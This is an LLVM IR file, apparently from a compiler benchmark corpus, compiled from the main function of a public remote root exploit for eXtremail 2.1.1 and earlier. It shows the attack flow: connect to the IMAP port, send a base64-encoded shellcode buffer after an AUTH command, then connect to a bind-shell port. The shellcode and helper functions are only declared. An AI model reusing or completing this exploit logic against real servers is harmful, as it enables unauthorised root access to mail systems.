; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_4534.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_4534.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.target_t = type { i32, i64 }

@BUF_SIZE = common dso_local global i32 0, align 4
@BBUF_SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [116 x i8] c"eXtremail <=2.1.1 remote root exploit\0Aby: <mu-b@digit-labs.org>\0Ahttp://www.digit-labs.org/ -- Digit-Labs 2007!@$!\0A\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [27 x i8] c"Usage: %s <host> <target>\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4
@NUM_TARGETS = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [25 x i8] c"Only %d targets known!!\0A\00", align 1
@targets = common dso_local global %struct.target_t* null, align 8
@.str.3 = private unnamed_addr constant [21 x i8] c"+Connecting to %s...\00", align 1
@PORT_IMAPD = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [13 x i8] c"  connected\0A\00", align 1
@.str.5 = private unnamed_addr constant [10 x i8] c"fp: 0x%x\0A\00", align 1
@.str.6 = private unnamed_addr constant [13 x i8] c"buf len: %d\0A\00", align 1
@.str.7 = private unnamed_addr constant [35 x i8] c"+Building buffer with shellcode...\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"  done\0A\00", align 1
@.str.9 = private unnamed_addr constant [35 x i8] c"+Building base64 encoded buffer...\00", align 1
@.str.10 = private unnamed_addr constant [19 x i8] c"+Making request...\00", align 1
@AUTH_CMD = common dso_local global i8* null, align 8
@.str.11 = private unnamed_addr constant [46 x i8] c"+Waiting for the shellcode to be executed...\0A\00", align 1
@PORT_SHELL = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [10 x i8] c"+Wh00t!\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca %struct.target_t*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i32, i32* @BUF_SIZE, align 4
  %13 = zext i32 %12 to i64
  %14 = call i8* @llvm.stacksave()
  store i8* %14, i8** %8, align 8
  %15 = alloca i8, i64 %13, align 16
  store i64 %13, i64* %9, align 8
  %16 = load i32, i32* @BBUF_SIZE, align 4
  %17 = zext i32 %16 to i64
  %18 = alloca i8, i64 %17, align 16
  store i64 %17, i64* %10, align 8
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str, i64 0, i64 0))
  %20 = load i32, i32* %4, align 4
  %21 = icmp sle i32 %20, 2
  br i1 %21, label %22, label %30

22:                                               ; preds = %2
  %23 = load i32, i32* @stderr, align 4
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 0
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 (i32, i8*, ...) @fprintf(i32 %23, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.1, i64 0, i64 0), i8* %26)
  %28 = load i32, i32* @EXIT_SUCCESS, align 4
  %29 = call i32 @exit(i32 %28) #4
  unreachable

30:                                               ; preds = %2
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 2
  %33 = load i8*, i8** %32, align 8
  %34 = call i64 @atoi(i8* %33)
  %35 = load i32, i32* @NUM_TARGETS, align 4
  %36 = sext i32 %35 to i64
  %37 = icmp uge i64 %34, %36
  br i1 %37, label %38, label %44

38:                                               ; preds = %30
  %39 = load i32, i32* @stderr, align 4
  %40 = load i32, i32* @NUM_TARGETS, align 4
  %41 = call i32 (i32, i8*, ...) @fprintf(i32 %39, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.2, i64 0, i64 0), i32 %40)
  %42 = load i32, i32* @EXIT_SUCCESS, align 4
  %43 = call i32 @exit(i32 %42) #4
  unreachable

44:                                               ; preds = %30
  %45 = load %struct.target_t*, %struct.target_t** @targets, align 8
  %46 = load i8**, i8*** %5, align 8
  %47 = getelementptr inbounds i8*, i8** %46, i64 2
  %48 = load i8*, i8** %47, align 8
  %49 = call i64 @atoi(i8* %48)
  %50 = getelementptr inbounds %struct.target_t, %struct.target_t* %45, i64 %49
  store %struct.target_t* %50, %struct.target_t** %11, align 8
  %51 = load i8**, i8*** %5, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 1
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.3, i64 0, i64 0), i8* %53)
  %55 = load i8**, i8*** %5, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 1
  %57 = load i8*, i8** %56, align 8
  %58 = load i32, i32* @PORT_IMAPD, align 4
  %59 = call i32 @sockami(i8* %57, i32 %58)
  store i32 %59, i32* %6, align 4
  %60 = load i32, i32* %6, align 4
  %61 = sub i64 %13, 1
  %62 = trunc i64 %61 to i32
  %63 = call i32 @sock_recv(i32 %60, i8* %15, i32 %62)
  store i32 %63, i32* %7, align 4
  %64 = load i32, i32* %7, align 4
  %65 = icmp slt i32 %64, 0
  br i1 %65, label %66, label %69

66:                                               ; preds = %44
  %67 = load i32, i32* @EXIT_SUCCESS, align 4
  %68 = call i32 @exit(i32 %67) #4
  unreachable

69:                                               ; preds = %44
  %70 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.4, i64 0, i64 0))
  %71 = load %struct.target_t*, %struct.target_t** %11, align 8
  %72 = getelementptr inbounds %struct.target_t, %struct.target_t* %71, i32 0, i32 1
  %73 = load i64, i64* %72, align 8
  %74 = trunc i64 %73 to i32
  %75 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0), i32 %74)
  %76 = load %struct.target_t*, %struct.target_t** %11, align 8
  %77 = getelementptr inbounds %struct.target_t, %struct.target_t* %76, i32 0, i32 0
  %78 = load i32, i32* %77, align 8
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.6, i64 0, i64 0), i32 %78)
  %80 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.7, i64 0, i64 0))
  %81 = trunc i64 %13 to i32
  %82 = call i32 @memset(i8* %15, i32 0, i32 %81)
  %83 = load %struct.target_t*, %struct.target_t** %11, align 8
  %84 = call i32 @zbuffami(i8* %15, %struct.target_t* %83)
  %85 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0))
  %86 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.9, i64 0, i64 0))
  %87 = load %struct.target_t*, %struct.target_t** %11, align 8
  %88 = getelementptr inbounds %struct.target_t, %struct.target_t* %87, i32 0, i32 0
  %89 = load i32, i32* %88, align 8
  %90 = call i32 @base64(i8* %15, i8* %18, i32 %89)
  %91 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0))
  %92 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.10, i64 0, i64 0))
  %93 = load i32, i32* %6, align 4
  %94 = load i8*, i8** @AUTH_CMD, align 8
  %95 = load i8*, i8** @AUTH_CMD, align 8
  %96 = call i32 @strlen(i8* %95)
  %97 = call i32 @sock_send(i32 %93, i8* %94, i32 %96)
  %98 = load i32, i32* %6, align 4
  %99 = sub i64 %13, 1
  %100 = trunc i64 %99 to i32
  %101 = call i32 @sock_recv(i32 %98, i8* %15, i32 %100)
  store i32 %101, i32* %7, align 4
  %102 = load i32, i32* %7, align 4
  %103 = icmp slt i32 %102, 0
  br i1 %103, label %104, label %107

104:                                              ; preds = %69
  %105 = load i32, i32* @EXIT_SUCCESS, align 4
  %106 = call i32 @exit(i32 %105) #4
  unreachable

107:                                              ; preds = %69
  %108 = load i32, i32* %6, align 4
  %109 = call i32 @strlen(i8* %18)
  %110 = call i32 @sock_send(i32 %108, i8* %18, i32 %109)
  %111 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0))
  %112 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.11, i64 0, i64 0))
  %113 = call i32 @sleep(i32 1)
  %114 = load i8**, i8*** %5, align 8
  %115 = getelementptr inbounds i8*, i8** %114, i64 1
  %116 = load i8*, i8** %115, align 8
  %117 = load i32, i32* @PORT_SHELL, align 4
  %118 = call i32 @sockami(i8* %116, i32 %117)
  store i32 %118, i32* %6, align 4
  %119 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.12, i64 0, i64 0))
  %120 = load i32, i32* %6, align 4
  %121 = call i32 @shellami(i32 %120)
  %122 = load i32, i32* @EXIT_SUCCESS, align 4
  store i32 %122, i32* %3, align 4
  %123 = load i8*, i8** %8, align 8
  call void @llvm.stackrestore(i8* %123)
  %124 = load i32, i32* %3, align 4
  ret i32 %124
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i64 @atoi(i8*) #2

declare dso_local i32 @sockami(i8*, i32) #2

declare dso_local i32 @sock_recv(i32, i8*, i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @zbuffami(i8*, %struct.target_t*) #2

declare dso_local i32 @base64(i8*, i8*, i32) #2

declare dso_local i32 @sock_send(i32, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @shellami(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
